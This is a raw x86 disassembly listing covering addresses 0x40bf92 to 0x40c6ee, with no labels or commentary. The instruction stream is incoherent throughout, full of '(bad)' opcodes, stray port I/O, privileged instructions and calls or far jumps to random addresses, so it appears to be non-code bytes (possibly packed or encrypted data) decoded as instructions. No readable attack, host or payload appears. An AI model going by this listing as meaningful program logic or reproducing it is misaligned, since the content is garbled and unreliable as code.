  40bf92:	pop    ebp
  40bf93:	sbb    eax,0x5365fb12
  40bf98:	push   es
  40bf99:	mov    edi,0xe51eeea3
  40bf9e:	ja     0x40bfb1
  40bfa0:	loope  0x40c019
  40bfa2:	fmul   st,st(2)
  40bfa4:	cmc    
  40bfa5:	jg     0x40bfac
  40bfa7:	es sub eax,ebp
  40bfaa:	outs   dx,DWORD PTR ds:[esi]
  40bfab:	sbb    cl,BYTE PTR [eax+eiz*8+0x73ca790f]
  40bfb2:	sar    BYTE PTR ds:0xd4d2b06c,0xb2
  40bfb9:	xor    eax,edx
  40bfbb:	xchg   ecx,eax
  40bfbc:	sahf   
  40bfbd:	sar    BYTE PTR [ebp+0x64],cl
  40bfc0:	sbb    eax,DWORD PTR cs:[edx+edi*8-0x3]
  40bfc5:	pop    edi
  40bfc6:	mov    ebp,0xc1a245e2
  40bfcb:	ret    
  40bfcc:	jne    0x40bf82
  40bfce:	cwde   
  40bfcf:	(bad)  
  40bfd0:	pop    ds
  40bfd1:	enter  0xf25e,0xb6
  40bfd5:	pop    eax
  40bfd6:	jo     0x40c04f
  40bfd8:	repz push ecx
  40bfda:	popa   
  40bfdb:	mov    ds:0x8c510c1a,al
  40bfe0:	xchg   edi,eax
  40bfe1:	inc    eax
  40bfe2:	cmp    bh,BYTE PTR ds:0x39dfa30c
  40bfe8:	push   ss
  40bfe9:	retf   
  40bfea:	dec    edx
  40bfeb:	pop    esp
  40bfec:	int3   
  40bfed:	test   DWORD PTR [esi-0x3bfe9fe0],eax
  40bff3:	adc    eax,0xcd9599e4
  40bff8:	xor    esi,DWORD PTR [eax-0x1e4f74f1]
  40bffe:	adc    ebp,DWORD PTR [ecx+0x49]
  40c001:	adc    BYTE PTR [ecx-0x15343b87],ah
  40c007:	jbe    0x40c06e
  40c009:	fcomip st,st(3)
  40c00b:	fsub   DWORD PTR [esp+edx*4]
  40c00e:	and    bl,cl
  40c010:	and    DWORD PTR [eax-0x46c0d4b8],ecx
  40c016:	sbb    al,0x2b
  40c018:	int3   
  40c019:	jmp    0x40bfdd
  40c01b:	mov    ecx,0x1dce55f4
  40c020:	(bad)  
  40c021:	clc    
  40c022:	mov    ah,0x24
  40c024:	aad    0x4
  40c026:	dec    ecx
  40c027:	pop    ebx
  40c028:	fisub  DWORD PTR [ebp+0x69227c0c]
  40c02e:	add    ch,BYTE PTR [ebx]
  40c030:	dec    edi
  40c031:	push   ss
  40c032:	and    al,0xd6
  40c034:	mov    eax,ds:0x7fa72b81
  40c039:	push   ebp
  40c03a:	ins    BYTE PTR es:[edi],dx
  40c03b:	fild   DWORD PTR [ecx]
  40c03d:	stc    
  40c03e:	ins    DWORD PTR es:[edi],dx
  40c03f:	outs   dx,BYTE PTR ds:[esi]
  40c040:	dec    edx
  40c041:	sub    DWORD PTR [eax+0x79],eax
  40c044:	(bad)  
  40c045:	push   ecx
  40c046:	not    BYTE PTR [edi-0x5cca8e9d]
  40c04c:	ss sub ch,0x59
  40c050:	aaa    
  40c051:	push   ecx
  40c052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c053:	icebp  
  40c054:	sbb    eax,0x8d5e38b4
  40c059:	mov    DWORD PTR [edx-0x1437cae7],edx
  40c05f:	lods   al,BYTE PTR ds:[esi]
  40c060:	xlat   BYTE PTR ds:[ebx]
  40c061:	(bad)  
  40c062:	cld    
  40c063:	pusha  
  40c064:	jge    0x40c051
  40c066:	jno    0x40c037
  40c068:	mov    dh,BYTE PTR [edi-0x388ff06a]
  40c06e:	xor    DWORD PTR [ebx-0x42],eax
  40c071:	scas   eax,DWORD PTR es:[edi]
  40c072:	push   ss
  40c073:	mov    al,BYTE PTR [edi+0x70]
  40c076:	sbb    ecx,esi
  40c078:	and    BYTE PTR [edx+ecx*8],dl
  40c07b:	add    BYTE PTR [eax+0x25af40ce],dh
  40c081:	stos   BYTE PTR es:[edi],al
  40c082:	jb     0x40c101
  40c084:	out    dx,al
  40c085:	dec    ebx
  40c086:	dec    esi
  40c087:	cmp    edx,ebx
  40c089:	sbb    BYTE PTR [edi+ebx*4-0x6e6b9443],0x8c
  40c091:	mov    eax,0x5f4be041
  40c096:	pop    edx
  40c097:	jno    0x40c032
  40c099:	pop    ds
  40c09a:	leave  
  40c09b:	pop    eax
  40c09c:	push   es
  40c09d:	retf   
  40c09e:	pop    edx
  40c09f:	push   ecx
  40c0a0:	adc    eax,0xa13023ea
  40c0a5:	lock (bad) 
  40c0a9:	ss push ds
  40c0ab:	scas   al,BYTE PTR es:[edi]
  40c0ac:	fscale 
  40c0ae:	ret    
  40c0af:	add    ebx,DWORD PTR [ebp-0x17]
  40c0b2:	inc    esp
  40c0b3:	mov    ds:0x7d302a27,al
  40c0b8:	mov    al,ds:0x6cbff677
  40c0bd:	push   DWORD PTR [ebp+0x60]
  40c0c0:	and    DWORD PTR [ebp-0x535cea4c],eax
  40c0c6:	sub    BYTE PTR [edi-0x6a673e54],cl
  40c0cc:	jp     0x40c07a
  40c0ce:	call   0x6e85f6f7
  40c0d3:	sbb    DWORD PTR [edi+0x183b1c9a],eax
  40c0d9:	retf   0x7e3a
  40c0dc:	std    
  40c0dd:	mov    al,BYTE PTR [edi+ebp*8-0x53]
  40c0e1:	rcr    BYTE PTR [ebx+eiz*4],cl
  40c0e4:	sbb    BYTE PTR [eax-0x1fcc968f],ch
  40c0ea:	adc    edx,DWORD PTR [ecx+eax*4]
  40c0ed:	cmp    bl,0xf5
  40c0f0:	xchg   esi,eax
  40c0f1:	and    eax,0xe76bdb37
  40c0f6:	mov    al,0x6d
  40c0f8:	inc    ebx
  40c0f9:	repz sub al,0xc5
  40c0fc:	inc    esp
  40c0fd:	jg     0x40c088
  40c0ff:	cdq    
  40c100:	sar    DWORD PTR [esi+0x81c64f8],cl
  40c106:	fld    TBYTE PTR [eax+eax*1]
  40c109:	add    edx,DWORD PTR [ecx]
  40c10b:	cmp    DWORD PTR [ecx-0x60],esi
  40c10e:	icebp  
  40c10f:	cmp    DWORD PTR [ecx-0x5d],esp
  40c112:	sub    dl,BYTE PTR [edi+ebx*8-0x27]
  40c116:	pop    edx
  40c117:	jbe    0x40c0f4
  40c119:	pop    esi
  40c11a:	cld    
  40c11b:	cli    
  40c11c:	mov    esi,DWORD PTR [eax+0x35]
  40c11f:	and    eax,0xc1720f65
  40c124:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c125:	scas   al,BYTE PTR es:[edi]
  40c126:	xchg   esi,eax
  40c127:	mov    ds:0xda5fce2e,al
  40c12c:	lods   al,BYTE PTR ds:[esi]
  40c12d:	push   edi
  40c12e:	and    BYTE PTR [ecx+eiz*2+0x36],ah
  40c132:	mov    WORD PTR [ecx-0x1ea92970],gs
  40c138:	mov    ds:0xf6e441b0,eax
  40c13d:	das    
  40c13e:	or     al,0x43
  40c140:	out    dx,al
  40c141:	push   eax
  40c142:	mov    bh,0x14
  40c144:	clc    
  40c145:	ret    0x6b19
  40c148:	xlat   BYTE PTR ds:[ebx]
  40c149:	inc    edi
  40c14a:	mov    DWORD PTR [edi-0x4c948bcf],ecx
  40c150:	sub    ebp,DWORD PTR [esi+0x31a9fa0f]
  40c156:	xor    BYTE PTR [esi-0x2a],bh
  40c159:	repnz inc edi
  40c15b:	and    bl,BYTE PTR [edx-0x7e]
  40c15e:	mov    ebx,0x35194b80
  40c163:	mov    dh,0xe5
  40c165:	sub    ecx,DWORD PTR [ebx+0x2efc1f02]
  40c16b:	adc    DWORD PTR [ecx],esi
  40c16d:	call   0x2e60:0xfd58b445
  40c174:	lods   eax,DWORD PTR ds:[esi]
  40c175:	and    al,0x8c
  40c177:	inc    ebx
  40c178:	iret   
  40c179:	adc    BYTE PTR [ecx+0x353d06ba],dl
  40c17f:	jnp    0x40c180
  40c181:	test   al,0x31
  40c183:	ins    BYTE PTR es:[edi],dx
  40c184:	or     eax,0xdc4fa1bb
  40c189:	mov    ch,0xb5
  40c18b:	icebp  
  40c18c:	rcl    DWORD PTR [ebp-0x1000895f],1
  40c192:	mov    edx,0x2f2f7501
  40c197:	cwde   
  40c198:	(bad)  
  40c19a:	out    dx,eax
  40c19b:	pushf  
  40c19c:	cwde   
  40c19d:	xchg   edx,eax
  40c19e:	js     0x40c176
  40c1a0:	(bad)  
  40c1a1:	mov    ebx,0x1d42a6f5
  40c1a6:	nop
  40c1a7:	and    eax,0xf9b05300
  40c1ac:	out    dx,al
  40c1ad:	shr    DWORD PTR [edx+0x5fb27925],1
  40c1b3:	std    
  40c1b4:	loop   0x40c1cf
  40c1b6:	xchg   edx,eax
  40c1b7:	leave  
  40c1b8:	inc    edx
  40c1b9:	inc    ebx
  40c1ba:	sbb    DWORD PTR [ebx],edi
  40c1bc:	call   0x5c879ecc
  40c1c1:	push   edx
  40c1c2:	mov    WORD PTR [ebp-0x114a4222],?
  40c1c8:	mov    al,0x8a
  40c1ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1cb:	jnp    0x40c208
  40c1cd:	pop    ebx
  40c1ce:	jne    0x40c16c
  40c1d0:	mov    cl,0x1c
  40c1d2:	sbb    eax,0x88e9e04b
  40c1d7:	add    DWORD PTR [edi-0x55],ebp
  40c1da:	outs   dx,DWORD PTR ds:[esi]
  40c1db:	idiv   DWORD PTR [esi+eax*8+0x5a]
  40c1df:	rol    DWORD PTR [ebp-0x3e],1
  40c1e2:	mov    esp,0x327ccef
  40c1e7:	and    bl,BYTE PTR [edi-0x34]
  40c1ea:	test   BYTE PTR [ebx],dl
  40c1ec:	jmp    0x40c252
  40c1ee:	fst    DWORD PTR [ebx]
  40c1f0:	sub    ebp,DWORD PTR [esi+0x7b83a058]
  40c1f6:	test   DWORD PTR [eax+eiz*8+0x35],ebx
  40c1fa:	in     eax,dx
  40c1fb:	fistp  QWORD PTR [eax+0x1c]
  40c1fe:	je     0x40c1bb
  40c200:	push   ss
  40c201:	cmp    esi,0xbf47adf
  40c207:	hlt    
  40c208:	pushf  
  40c209:	call   ebp
  40c20b:	xchg   ebx,ebx
  40c20d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c20e:	rol    DWORD PTR [edi+0x32],1
  40c211:	xchg   ecx,eax
  40c212:	jp     0x40c209
  40c214:	xchg   ebx,eax
  40c215:	ret    
  40c216:	dec    ebp
  40c217:	pop    es
  40c218:	pop    edx
  40c219:	nop
  40c21a:	push   cs
  40c21b:	or     BYTE PTR [esi+0x3967c408],0xde
  40c222:	add    DWORD PTR [edi-0x75bb5081],ebp
  40c228:	sub    eax,0x6ce58270
  40c22d:	dec    ecx
  40c22e:	push   ebp
  40c22f:	add    DWORD PTR [edx],0x86d70570
  40c235:	out    dx,eax
  40c236:	jl     0x40c1d7
  40c238:	outs   dx,DWORD PTR ds:[esi]
  40c239:	xor    al,0xe3
  40c23b:	vsubss xmm7,xmm2,DWORD PTR [ebx+0x3]
  40c240:	push   0x70e6a42a
  40c245:	dec    edx
  40c246:	dec    ebp
  40c247:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c248:	call   0x22a8b29e
  40c24d:	add    DWORD PTR [ebx-0x3d],esp
  40c250:	sbb    al,0xc1
  40c252:	push   ss
  40c253:	(bad)  
  40c254:	lods   eax,DWORD PTR ds:[esi]
  40c255:	iret   
  40c256:	xor    BYTE PTR [ebx-0x18],cl
  40c259:	pop    esp
  40c25b:	push   ebx
  40c25c:	xor    cl,al
  40c25e:	aas    
  40c25f:	cmp    al,0x53
  40c261:	jnp    0x40c218
  40c263:	scas   eax,DWORD PTR es:[edi]
  40c264:	xchg   edx,eax
  40c265:	mov    eax,0x4afdcea9
  40c26a:	cwde   
  40c26b:	pop    es
  40c26c:	jl     0x40c1fa
  40c26e:	pop    edi
  40c26f:	sub    DWORD PTR [ecx+0xd],0xffffffb7
  40c273:	fsub   DWORD PTR [edx]
  40c275:	into   
  40c276:	sbb    DWORD PTR [edx+0x780fc01],eax
  40c27c:	rol    BYTE PTR [esi],1
  40c27e:	jl     0x40c23d
  40c280:	or     al,0x66
  40c282:	xchg   BYTE PTR [esi+ebp*2-0x1df9474a],dh
  40c289:	add    esp,ebx
  40c28b:	cmp    al,0xdb
  40c28d:	cwde   
  40c28e:	inc    eax
  40c28f:	dec    esi
  40c290:	xor    al,0xf5
  40c292:	sub    ebp,DWORD PTR [ebx+0x72fc305d]
  40c298:	dec    esp
  40c299:	ins    BYTE PTR es:[edi],dx
  40c29a:	inc    eax
  40c29b:	xchg   BYTE PTR [ebx],bl
  40c29d:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40c29f:	fsubr  DWORD PTR [eax+0x3d989868]
  40c2a5:	rcl    DWORD PTR [esi+0x7c],1
  40c2a8:	and    eax,0xb99ea7bc
  40c2ad:	mov    WORD PTR [ebp+0x72f0463b],?
  40c2b3:	jle    0x40c239
  40c2b5:	xchg   edx,eax
  40c2b6:	cmp    al,0xf1
  40c2b8:	ret    0x12bd
  40c2bb:	repz stc 
  40c2bd:	test   BYTE PTR ds:0xe221a802,cl
  40c2c3:	mov    eax,0x2fe93f4e
  40c2c8:	(bad)  
  40c2c9:	fistp  WORD PTR [ecx]
  40c2cb:	daa    
  40c2cc:	cwde   
  40c2cd:	push   esp
  40c2ce:	mov    cs,WORD PTR [eax+ecx*2-0x19]
  40c2d2:	jecxz  0x40c2c0
  40c2d4:	cmp    bh,al
  40c2d6:	jl     0x40c305
  40c2d8:	jo     0x40c2cc
  40c2da:	jbe    0x40c297
  40c2dc:	push   ebx
  40c2dd:	ins    DWORD PTR es:[edi],dx
  40c2de:	out    dx,al
  40c2df:	jo     0x40c2c2
  40c2e1:	mov    eax,ds:0xa36c4cba
  40c2e6:	(bad)  
  40c2e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2e8:	xchg   ebx,eax
  40c2e9:	inc    ebp
  40c2ea:	pop    eax
  40c2eb:	scas   al,BYTE PTR es:[edi]
  40c2ec:	push   ebx
  40c2ed:	mov    edx,0x63dab464
  40c2f2:	imul   esp,DWORD PTR [edx-0x4e56b5c0],0x22212e7d
  40c2fc:	push   ebx
  40c2fd:	in     eax,0xf4
  40c2ff:	inc    esi
  40c300:	mov    ebp,0xfce793cf
  40c305:	mov    ds:0x7fb5530b,eax
  40c30a:	das    
  40c30b:	pop    esp
  40c30c:	stc    
  40c30d:	mov    edx,esp
  40c30f:	outs   dx,DWORD PTR ds:[esi]
  40c310:	loop   0x40c2a1
  40c312:	push   ds
  40c313:	jmp    0x4a79:0x5547d11
  40c31a:	sti    
  40c31b:	in     al,0xfb
  40c31d:	push   ebp
  40c31e:	into   
  40c31f:	aas    
  40c320:	icebp  
  40c321:	push   edi
  40c322:	push   esi
  40c323:	xor    BYTE PTR [edi],al
  40c325:	pop    ss
  40c326:	ret    0x7266
  40c329:	jmp    0x40c344
  40c32b:	sub    eax,0xaabbfde8
  40c330:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c331:	sti    
  40c332:	(bad)  
  40c333:	pop    ecx
  40c334:	f2xm1  
  40c336:	add    al,0x5f
  40c338:	nop
  40c339:	icebp  
  40c33a:	xchg   ebp,eax
  40c33b:	stos   DWORD PTR es:[edi],eax
  40c33c:	addr16 mov ds:0x807c,eax
  40c340:	mov    esp,0x7bf801a9
  40c345:	aad    0x16
  40c347:	push   es
  40c348:	pop    ebp
  40c349:	inc    edx
  40c34a:	add    ebx,DWORD PTR ds:0x753bdb45
  40c350:	jmp    0x6f21:0x5f4e3295
  40c357:	inc    eax
  40c358:	das    
  40c359:	jno    0x40c3a1
  40c35b:	ficomp DWORD PTR [eax-0x3cea0815]
  40c361:	int    0xc6
  40c363:	adc    bh,BYTE PTR [ebp-0x4a72e3e7]
  40c369:	cmp    edi,DWORD PTR [edi+0x56]
  40c36c:	jle    0x40c310
  40c36e:	pushf  
  40c36f:	push   es
  40c370:	aaa    
  40c371:	and    DWORD PTR [ebx+esi*2],edx
  40c374:	xchg   ecx,eax
  40c375:	call   0x40fa9df7
  40c37a:	repz dec ebp
  40c37c:	(bad)  
  40c37d:	into   
  40c37e:	push   0xffffffe0
  40c380:	cld    
  40c381:	outs   dx,DWORD PTR ds:[esi]
  40c382:	sub    DWORD PTR [esp+ebx*8-0x17],0x2eae8483
  40c38a:	jbe    0x40c3ac
  40c38c:	push   es
  40c38d:	and    DWORD PTR [edi],ebx
  40c38f:	mov    dl,0x92
  40c391:	repz rcl BYTE PTR [eax+0x72],cl
  40c395:	jmp    0x1276e44e
  40c39a:	and    eax,0xb3bf0aff
  40c39f:	popf   
  40c3a0:	push   ebx
  40c3a1:	xchg   BYTE PTR ds:0xe4eb404c,ch
  40c3a7:	pop    ebp
  40c3a8:	fistp  QWORD PTR ds:0x7a90505f
  40c3ae:	(bad)  
  40c3af:	loopne 0x40c392
  40c3b1:	add    DWORD PTR [ecx-0x4b2c7a3f],0x29df3be1
  40c3bb:	jmp    0x40c411
  40c3bd:	cs popf 
  40c3bf:	cmp    DWORD PTR cs:[ecx+0x3869227d],esi
  40c3c6:	aaa    
  40c3c7:	out    dx,eax
  40c3c8:	rcl    DWORD PTR [ebp+0x45],1
  40c3cb:	scas   al,BYTE PTR es:[edi]
  40c3cc:	inc    ebx
  40c3cd:	cmp    ecx,ebx
  40c3cf:	jg     0x40c427
  40c3d1:	mov    DWORD PTR [ebx+0x7cfe433e],esp
  40c3d7:	mov    esi,0x161d376
  40c3dc:	sub    BYTE PTR [ebp-0x80],bl
  40c3df:	popa   
  40c3e0:	add    dh,BYTE PTR ds:[ebx+0x7c]
  40c3e4:	xlat   BYTE PTR ds:[ebx]
  40c3e5:	jp     0x40c3d5
  40c3e7:	mov    esi,0xfb1cf0da
  40c3ec:	(bad)  
  40c3ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3ee:	jne    0x40c426
  40c3f0:	stos   BYTE PTR es:[edi],al
  40c3f1:	inc    edi
  40c3f2:	addr16 cdq 
  40c3f4:	leave  
  40c3f5:	out    dx,al
  40c3f6:	add    DWORD PTR [esi-0x79034b58],0x6d
  40c3fd:	push   ebx
  40c3fe:	rcr    ch,1
  40c400:	jl     0x40c39e
  40c402:	jmp    0x40c41a
  40c404:	retf   
  40c405:	xor    eax,0x82d2ab2f
  40c40a:	es adc al,0x72
  40c40d:	cwde   
  40c40e:	(bad)  [ecx+0x1c06e6e9]
  40c414:	xchg   ebx,eax
  40c415:	pop    esi
  40c416:	pop    esp
  40c417:	aaa    
  40c418:	cmp    DWORD PTR ds:[eax-0x7b909007],0x5a
  40c420:	repz sbb al,0x89
  40c423:	cwde   
  40c424:	xchg   DWORD PTR [eax-0x7a504425],ecx
  40c42a:	stos   BYTE PTR es:[edi],al
  40c42b:	cdq    
  40c42c:	sahf   
  40c42d:	jmp    0x40c4ad
  40c42f:	pop    ecx
  40c430:	jae    0x40c3fd
  40c432:	push   ss
  40c433:	xor    DWORD PTR [eax],esi
  40c435:	and    DWORD PTR [edx-0x69],ebx
  40c438:	xlat   BYTE PTR ds:[ebx]
  40c439:	push   edx
  40c43a:	mov    ebx,0x54ea3a12
  40c43f:	scas   eax,DWORD PTR es:[edi]
  40c440:	arpl   WORD PTR [esi-0x15b8dd1],ax
  40c446:	loop   0x40c403
  40c448:	jmp    0x751908d5
  40c44d:	lea    ebp,[esi+0x8]
  40c450:	cmp    eax,0x99c72779
  40c455:	adc    bh,BYTE PTR [ebx]
  40c457:	dec    ebp
  40c458:	jnp    0x40c4ab
  40c45a:	dec    edi
  40c45b:	test   DWORD PTR [edi+0xb4d7c1a],esi
  40c461:	out    0x5,eax
  40c463:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c465:	jnp    0x40c41f
  40c467:	call   0x379fdd79
  40c46c:	inc    eax
  40c46d:	mov    eax,0xae1cfcae
  40c472:	sbb    DWORD PTR [ebx],ebp
  40c474:	xchg   ecx,eax
  40c475:	jle    0x40c471
  40c477:	lods   eax,DWORD PTR ds:[esi]
  40c478:	jno    0x40c4c5
  40c47a:	xor    eax,0x96380107
  40c47f:	adc    edx,DWORD PTR [ebx-0x19]
  40c482:	xor    ecx,DWORD PTR [edi+ebx*1+0x36]
  40c486:	pop    ss
  40c487:	je     0x40c47b
  40c489:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c48a:	fst    DWORD PTR [esi+esi*1]
  40c48d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c48e:	lea    edi,[ecx+0x17]
  40c491:	clc    
  40c492:	sahf   
  40c493:	mov    ?,WORD PTR [edi+0x52]
  40c496:	mov    ecx,0xbc1239da
  40c49b:	sti    
  40c49c:	test   eax,0x9197c674
  40c4a1:	lock loop 0x40c461
  40c4a4:	add    bh,BYTE PTR [ebx+0x7b1510af]
  40c4aa:	lea    eax,ds:0x24a0e7de
  40c4b0:	mov    cl,BYTE PTR [ebx+0x4f019030]
  40c4b6:	ror    DWORD PTR [esi+eiz*4+0x5d2bc295],0x4
  40c4be:	jmp    0x5e65:0xee222e18
  40c4c5:	neg    ecx
  40c4c7:	in     eax,dx
  40c4c8:	ror    dh,1
  40c4ca:	xchg   edx,eax
  40c4cb:	pusha  
  40c4cc:	adc    eax,0x59914926
  40c4d1:	stos   DWORD PTR es:[edi],eax
  40c4d2:	mov    al,0xfa
  40c4d4:	adc    BYTE PTR [edi+0x4f778228],bh
  40c4da:	inc    edx
  40c4db:	repnz ins BYTE PTR es:[edi],dx
  40c4dd:	mov    eax,0x8325b93b
  40c4e2:	js     0x40c54f
  40c4e4:	ror    DWORD PTR [ebp-0x13],1
  40c4e7:	ds repnz sahf 
  40c4ea:	ret    
  40c4eb:	adc    eax,0x81753b71
  40c4f0:	data16 add BYTE PTR [ecx+edi*1],bh
  40c4f4:	pop    esp
  40c4f5:	(bad)  
  40c4f6:	leave  
  40c4f7:	xchg   DWORD PTR [eiz*8+0x12377fcc],edx
  40c4fe:	ret    0xbb20
  40c501:	les    eax,FWORD PTR [esi+0x69]
  40c504:	push   esp
  40c505:	mov    ebx,0x5771986b
  40c50a:	dec    ebp
  40c50b:	lahf   
  40c50c:	pop    ebp
  40c50d:	ror    BYTE PTR ds:0x307f09b6,1
  40c513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c514:	rol    edi,1
  40c516:	inc    eax
  40c517:	mov    ecx,0xeffca69e
  40c51c:	cmp    edi,DWORD PTR [ecx-0x7d]
  40c51f:	stos   DWORD PTR es:[edi],eax
  40c520:	inc    ebx
  40c521:	pushf  
  40c522:	out    dx,al
  40c523:	push   esi
  40c524:	push   ecx
  40c525:	jg     0x40c536
  40c527:	outs   dx,BYTE PTR ds:[esi]
  40c528:	push   ss
  40c529:	adc    ch,0x48
  40c52c:	push   0x566d09e4
  40c531:	(bad)  
  40c532:	cdq    
  40c533:	xchg   DWORD PTR ds:0xd778a2d1,ebp
  40c539:	jne    0x40c52e
  40c53b:	ret    
  40c53c:	dec    edi
  40c53d:	xor    al,0xcd
  40c53f:	and    al,0x98
  40c541:	push   esi
  40c542:	icebp  
  40c543:	push   0xbf67ac57
  40c548:	or     al,0xdd
  40c54a:	adc    al,0x89
  40c54c:	fnstcw WORD PTR [ebp+0x7816113c]
  40c552:	and    BYTE PTR [edx-0x64],0x84
  40c556:	inc    eax
  40c557:	xchg   esi,eax
  40c558:	add    BYTE PTR [eax+0x2d],dh
  40c55b:	fs or  DWORD PTR es:[eax+0x25a12ad0],0xffffff9d
  40c564:	stc    
  40c565:	popf   
  40c566:	test   DWORD PTR [edi+0x564a94d9],esp
  40c56c:	out    dx,al
  40c56d:	sbb    al,0x94
  40c56f:	mov    dh,0x4a
  40c571:	inc    ecx
  40c572:	(bad)  
  40c573:	sti    
  40c574:	add    esi,DWORD PTR [ebp-0x5fab6753]
  40c57a:	es mov ah,0xe1
  40c57d:	inc    esp
  40c57e:	test   BYTE PTR [ebp+0x5c],dh
  40c581:	retf   
  40c582:	scas   al,BYTE PTR es:[edi]
  40c583:	cmp    eax,0x8e726566
  40c588:	add    BYTE PTR [ebp+0x2576f67d],bl
  40c58e:	xchg   ebx,eax
  40c58f:	cdq    
  40c590:	call   0xf497311b
  40c595:	sar    ecx,cl
  40c597:	ds push ss
  40c599:	push   ss
  40c59a:	add    eax,0x1b852c59
  40c59f:	sub    bh,ah
  40c5a1:	mov    esp,DWORD PTR [ecx]
  40c5a3:	popa   
  40c5a4:	lods   al,BYTE PTR ds:[esi]
  40c5a5:	adc    DWORD PTR [edi],ebx
  40c5a7:	push   esi
  40c5a8:	call   0x46a27dcf
  40c5ad:	mov    eax,es
  40c5af:	or     edx,DWORD PTR [edi+ecx*8]
  40c5b2:	pop    edx
  40c5b4:	sar    DWORD PTR ss:[edx+0x44],0x1f
  40c5b9:	push   esp
  40c5ba:	mov    esp,0xa9468eda
  40c5bf:	xor    bl,0x18
  40c5c2:	cmc    
  40c5c3:	pop    ebp
  40c5c4:	(bad)  
  40c5c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5c7:	sub    eax,0x742c846
  40c5cc:	or     DWORD PTR [edx],0x2b372288
  40c5d2:	pop    es
  40c5d3:	mov    esi,0x255cbc4e
  40c5d8:	cdq    
  40c5d9:	icebp  
  40c5da:	sub    DWORD PTR [esi+0x6faaadf8],edi
  40c5e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5e1:	or     eax,DWORD PTR [ecx-0x5da43349]
  40c5e7:	mov    cl,0x52
  40c5e9:	mov    ecx,0xb78ce7c1
  40c5ee:	push   0xffffffb3
  40c5f0:	aaa    
  40c5f1:	pop    esp
  40c5f2:	and    edi,DWORD PTR [edi+ebp*8]
  40c5f5:	dec    eax
  40c5f6:	cmp    ah,bl
  40c5f8:	inc    ebx
  40c5f9:	xchg   ebp,eax
  40c5fa:	pop    edx
  40c5fb:	jmp    0x1f69:0x982a7d5b
  40c602:	pop    ds
  40c603:	aad    0x69
  40c605:	mov    al,0xe9
  40c607:	jle    0x40c612
  40c609:	push   esi
  40c60a:	icebp  
  40c60b:	push   edx
  40c60c:	push   ecx
  40c60d:	mov    cs,WORD PTR [ebx-0x1316a8f2]
  40c613:	lea    ebx,[edi+0x5f7b04ed]
  40c619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c61a:	or     DWORD PTR [edi-0x478e2bae],0x22
  40c621:	xchg   edx,eax
  40c622:	push   ss
  40c623:	loop   0x40c5c4
  40c625:	iret   
  40c626:	pop    es
  40c627:	gs stos BYTE PTR es:[edi],al
  40c629:	pushf  
  40c62a:	sbb    al,0x90
  40c62c:	jb     0x40c698
  40c62e:	pop    eax
  40c62f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c630:	nop
  40c631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c632:	aad    0xc0
  40c634:	imul   ebp,eax,0x64
  40c637:	gs into 
  40c639:	test   al,0xed
  40c63b:	nop
  40c63c:	out    dx,al
  40c63d:	and    BYTE PTR [eax],bl
  40c63f:	shl    ecx,1
  40c641:	cmp    eax,DWORD PTR [eax]
  40c643:	mov    ebx,0x26262237
  40c648:	rol    DWORD PTR ds:0x1fa733f4,1
  40c64e:	test   eax,0x7c69b15b
  40c653:	push   esi
  40c654:	and    bl,BYTE PTR [eax+ebp*8-0x46df133c]
  40c65b:	ss scas eax,DWORD PTR es:[edi]
  40c65d:	sub    dl,BYTE PTR [edx-0x5b]
  40c660:	vpmulhw xmm6,xmm0,xmm0
  40c664:	push   esp
  40c665:	cwde   
  40c666:	dec    esp
  40c667:	hlt    
  40c668:	cdq    
  40c669:	mov    bh,0xf1
  40c66b:	cmp    DWORD PTR [edi+edi*2],edx
  40c66e:	fld    DWORD PTR [ebx+0x33]
  40c671:	retf   
  40c672:	cli    
  40c673:	jmp    0xa8e79838
  40c678:	inc    ebx
  40c679:	imul   DWORD PTR ds:0xc49e4d22
  40c67f:	dec    edi
  40c680:	lods   eax,DWORD PTR ds:[esi]
  40c681:	in     al,0x62
  40c683:	or     ebp,DWORD PTR [ecx+0x1230bfd4]
  40c689:	add    eax,0x8fd8d350
  40c68e:	(bad)  
  40c68f:	xchg   ecx,eax
  40c690:	outs   dx,BYTE PTR ds:[esi]
  40c691:	ror    DWORD PTR [ecx+0x3a],cl
  40c694:	in     al,0xdc
  40c696:	popf   
  40c697:	sbb    esi,DWORD PTR [esp+eax*8-0x26]
  40c69b:	fsubr  QWORD PTR [ebx+0x718f7193]
  40c6a1:	and    BYTE PTR [esi-0x11],ah
  40c6a4:	sub    al,0x93
  40c6a6:	shl    DWORD PTR [ebx-0x2fdf3ffa],cl
  40c6ac:	jnp    0x40c652
  40c6ae:	mov    edx,0x73feb016
  40c6b3:	jno    0x40c660
  40c6b5:	xor    al,BYTE PTR [ecx]
  40c6b7:	ins    BYTE PTR es:[edi],dx
  40c6b8:	shl    DWORD PTR [eax-0x72f88c24],0x23
  40c6bf:	stc    
  40c6c0:	adc    eax,DWORD PTR [eax-0x5724cd92]
  40c6c6:	mov    BYTE PTR [ebx+ebp*1+0x54c12122],dh
  40c6cd:	mov    ebx,0x555a3178
  40c6d2:	xor    al,ah
  40c6d4:	scas   eax,DWORD PTR es:[edi]
  40c6d5:	sbb    DWORD PTR [eax+ecx*8-0x5d6dd5f2],edi
  40c6dc:	pop    ss
  40c6dd:	nop
  40c6de:	mov    bl,0xfa
  40c6e0:	sub    dh,bl
  40c6e2:	push   eax
  40c6e3:	bound  edx,QWORD PTR [eax-0x44]
  40c6e6:	daa    
  40c6e7:	(bad)  
  40c6e8:	mov    edx,0x430ff9e5
  40c6ed:	cwde   
  40c6ee:	(bad)  
